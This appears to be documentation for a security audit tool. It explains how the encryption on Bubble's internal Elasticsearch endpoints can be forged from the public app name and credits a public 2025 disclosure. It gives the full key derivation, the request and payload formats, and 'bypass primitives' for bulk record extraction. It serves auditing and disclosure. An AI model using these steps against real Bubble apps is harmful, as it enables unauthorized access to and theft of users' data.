# Elasticsearch crypto internals

Background notes on the cryptographic scheme used by Bubble's internal
`/elasticsearch/{search,aggregate,msearch,maggregate}` endpoints.

> **Attribution.** The vulnerability was originally reverse-engineered by
> **Pablo (and Lucca)** and published in April 2025 via
> [`demon-i386/pop_n_bubble`](https://github.com/demon-i386/pop_n_bubble),
> with coverage from GBHackers, Cyberpress, SecurityOnline, and TechNADU.
> `bubblepwn`'s implementation in `bubblepwn/bubble/es/crypto.py` is an
> independent rewrite driven by the public disclosure — no upstream code
> is reused. Tool author: [@Siin0pe](https://github.com/Siin0pe).

## High-level design

The client POSTs a JSON body with three base64 fields:

```json
{
  "x": "<IV wrapper>",
  "y": "<timestamp wrapper>",
  "z": "<payload>"
}
```

- `y` carries a fresh session **timestamp** (string of milliseconds since
  epoch).
- `x` carries a random **IV material** string (a JS `Math.random()` float
  stringified).
- `z` carries the actual JSON payload (e.g. a search or aggregate query),
  encrypted with a key and IV derived from the unwrapped timestamp and IV
  material, both of which ultimately depend only on the public
  `X-Bubble-Appname` HTTP header.

Knowing the value of `X-Bubble-Appname` is sufficient to forge the full
triple.

## Primitives

| Parameter | Value |
|---|---|
| Cipher | AES-CBC |
| Key size | 32 bytes (AES-256) |
| IV size | 16 bytes |
| KDF | PBKDF2-HMAC-MD5 |
| KDF iterations | 7 |
| KDF salt | `appname` (UTF-8) |
| Padding | PKCS7 |
| Transport encoding | base64 |

Two constant seed strings wrap `y` and `x`:

- `po9` → 3 bytes `0x70 0x6f 0x39`, used to derive the IV that encrypts the
  timestamp (`y`).
- `fl1` → 3 bytes `0x66 0x6c 0x31`, used to derive the IV that encrypts the
  IV material (`x`).

Both are hardcoded in Bubble's runtime and identical across every Bubble
app.

## Derivations

Given `app = appname.encode()`:

```
wrap_key   = PBKDF2-MD5(app,         salt=app, 7, dklen=32)
wrap_iv_y  = PBKDF2-MD5(b"po9",      salt=app, 7, dklen=16)
wrap_iv_x  = PBKDF2-MD5(b"fl1",      salt=app, 7, dklen=16)

timestamp  = <13-byte ASCII milliseconds>      # e.g. b"1776466814092"
iv_mat     = <19-byte ASCII string>            # e.g. b"0.27760384362836454"

outer_key  = PBKDF2-MD5(app + timestamp, salt=app, 7, dklen=32)
outer_iv   = PBKDF2-MD5(iv_mat,          salt=app, 7, dklen=16)
```

Wrapping:

```
y_plain = timestamp + b"_1"        # 15 bytes → PKCS7 pads with 1×b"\x01"
y_ct    = AES-CBC(y_plain, wrap_key, wrap_iv_y)

x_ct    = AES-CBC(iv_mat,   wrap_key, wrap_iv_x)     # 19 bytes → PKCS7 pads with 13×b"\r"

z_ct    = AES-CBC(payload_json, outer_key, outer_iv)
```

Server-side cleanup of the wrapper plaintexts:

- `y` plaintext: remove the `_1` marker, then any trailing `\x01` residue.
- `x` plaintext: remove any `\r`, `\x0e`, `\x0f` bytes (PKCS7 padding bytes
  for plaintext lengths 19 / 18 / 17 respectively — all of them fall inside
  the "strip-safe" set `{\r, \x0e, \x0f}` because Bubble always picks an
  `iv_material` length of 19).

Both sides (client and server) derive the outer key/iv from the **cleaned**
values, so both arrive at the same symmetric material.

## Request envelope

- Method: `POST`
- Path: `/elasticsearch/<endpoint>` (and `/version-test/elasticsearch/...`
  for the test branch)
- Headers: `Content-Type: application/json`,
  `X-Bubble-Appname: <slug>` (mandatory; the crypto fails otherwise).
- Body: the `{x, y, z}` triple above.
- No cookies, no CSRF — the endpoint does not validate session state.

## Response

Plaintext JSON; no response-side encryption.

For `/search`:

```json
{
  "hits": {
    "hits": [
      {"_source": {...}, "_id": "...", "_type": "...", "_version": N, "found": true},
      ...
    ]
  },
  "extras": [],
  "at_end": <bool>,
  "search_version": <ms>
}
```

For `/aggregate` (with `{fns: [{n: "count"}]}`):

```json
{"fns": [245], "count": 245, "search_version": 1776466512733}
```

`/aggregate` is the preferred probe for auditing: one request per type
returns the exact record count (for any count up to the page limit) without
transferring any record data.

## Payload shapes

Search:

```json
{
  "appname":      "<slug>",
  "app_version":  "live",
  "type":         "custom.<type_name>",
  "constraints":  [],
  "sorts_list":   [],
  "from":         0,
  "search_path":  "<stringified JSON>",
  "situation":    "initial search",
  "n":            100
}
```

Aggregate (count):

```json
{
  "appname":     "<slug>",
  "app_version": "live",
  "type":        "custom.<type_name>",
  "constraints": [],
  "aggregate":   {"fns": [{"n": "count"}]},
  "search_path": "<stringified JSON>"
}
```

Maggregate batches many aggregates in one HTTP round-trip:

```json
{
  "appname":     "<slug>",
  "app_version": "live",
  "aggregates":  [<one-aggregate-payload>, <another>, ...]
}
```

`search_path` is not strictly validated. A minimal placeholder is enough:

```json
{"constructor_name":"DataSource","args":[{"type":"raw","value":"Search"}]}
```

## Bypass primitives

The relevant parameters for an IDOR-style audit are:

- `type` — any `custom.<name>` appearing in the schema is queryable.
- `constraints: []` — empty returns every row the target's privacy rules
  allow for an anonymous client.
- `n` — Bubble caps the SPA at 100 per call but the server itself accepts
  up to `ALL_MAX / 10` (~100 000). Normal app traffic never approaches
  this; raising `n` is the clearest marker of abuse.
- `from` — pagination cursor.

Privacy rules are applied server-side; they can still filter rows and
individual fields. The crypto bypass only removes the client-side
obfuscation, not the server-side policy engine. Types with no rule (or
with always-true / empty-equals-empty rules) leak entirely.

## Why the scheme is weak

- The wrapping key material is the public `appname` string.
- PBKDF2 with 7 iterations imposes no computational cost on an attacker.
- The IV seeds (`po9`, `fl1`) are hardcoded constants.
- Server-side key derivation uses the same publicly-computable values the
  client uses.

In effect the whole scheme provides integrity obfuscation at best; there is
no authentication of the request. The security of the endpoint relies
entirely on the privacy rules configured for each data type.
